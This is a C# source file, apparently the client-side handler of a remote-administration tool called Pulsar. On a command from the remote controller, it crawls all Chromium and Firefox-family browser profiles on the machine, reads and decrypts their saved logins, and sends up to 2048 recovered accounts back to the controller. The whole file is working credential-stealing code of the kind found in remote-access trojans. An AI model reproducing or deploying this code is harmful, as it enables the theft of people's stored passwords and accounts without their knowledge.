using Pulsar.Client.Recovery;
using Pulsar.Client.Recovery.Browsers;
using Pulsar.Client.Recovery.Crawler;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Passwords;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;

//public struct BrowserChromium
//{
//    public string Name;
//    public string Path;
//    public string LocalState;
//    public ProfileChromium[] Profiles;
//}

//public struct ProfileChromium
//{
//    public string Name;
//    public string LoginData;
//    public string Path;
//}

//public struct BrowserGecko
//{
//    public string Name;
//    public string Path;
//    public string Key4;
//    public string Logins;
//}

namespace Pulsar.Client.Messages
{
    public class PasswordRecoveryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPasswords;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswords msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPasswords message)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();
            var sources = new List<PasswordRecoverySource>();
            bool truncated = false;
            const int MaxRecoveredAccounts = 2048;
            const int MaxSources = 128;

            List<Recovery.Browsers.AllBrowsers> browsers = Crawl.Start();

            foreach (var browser in browsers)
            {
                foreach (var chromium in browser.Chromium)
                {
                    foreach (var profile in chromium.Profiles)
                    {
                        try
                        {
                            var outcome = ChromiumBase.ReadAccountsBounded(profile.LoginData, chromium.LocalState, chromium.Name);
                            truncated |= outcome.Truncated;
                            foreach (var account in outcome.Accounts)
                            {
                                if (recovered.Count >= MaxRecoveredAccounts)
                                {
                                    truncated = true;
                                    break;
                                }
                                recovered.Add(account);
                            }
                            if (sources.Count < MaxSources)
                            {
                                sources.Add(new PasswordRecoverySource
                                {
                                    Application = chromium.Name,
                                    Profile = profile.Name,
                                    Status = outcome.Status,
                                    Detail = outcome.Detail,
                                    AccountCount = outcome.Accounts.Count
                                });
                            }
                        }
                        catch (Exception e)
                        {
                            Debug.WriteLine(e);
                            if (sources.Count < MaxSources)
                            {
                                sources.Add(new PasswordRecoverySource
                                {
                                    Application = chromium.Name,
                                    Profile = profile.Name,
                                    Status = PasswordRecoveryStatus.Failed,
                                    Detail = e.GetType().Name
                                });
                            }
                        }
                        if (recovered.Count >= MaxRecoveredAccounts)
                            break;
                    }
                    if (recovered.Count >= MaxRecoveredAccounts)
                        break;
                }

                foreach (var gecko in browser.Gecko)
                {
                    try
                    {
                        var outcome = FirefoxPassReader.ReadAccountsBounded(gecko.ProfilesDir, gecko.Name);
                        truncated |= outcome.Truncated;
                        foreach (var account in outcome.Accounts)
                        {
                            if (recovered.Count >= MaxRecoveredAccounts)
                            {
                                truncated = true;
                                break;
                            }
                            recovered.Add(account);
                        }
                        if (sources.Count < MaxSources)
                        {
                            sources.Add(new PasswordRecoverySource
                            {
                                Application = gecko.Name,
                                Profile = "Profiles",
                                Status = outcome.Status,
                                Detail = outcome.Detail,
                                AccountCount = outcome.Accounts.Count
                            });
                        }
                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                        if (sources.Count < MaxSources)
                        {
                            sources.Add(new PasswordRecoverySource
                            {
                                Application = gecko.Name,
                                Profile = "Profiles",
                                Status = PasswordRecoveryStatus.Failed,
                                Detail = e.GetType().Name
                            });
                        }
                    }
                }
            }

            client.Send(new GetPasswordsResponse
            {
                RecoveredAccounts = recovered,
                Sources = sources,
                Truncated = truncated
            });
        }
    }
}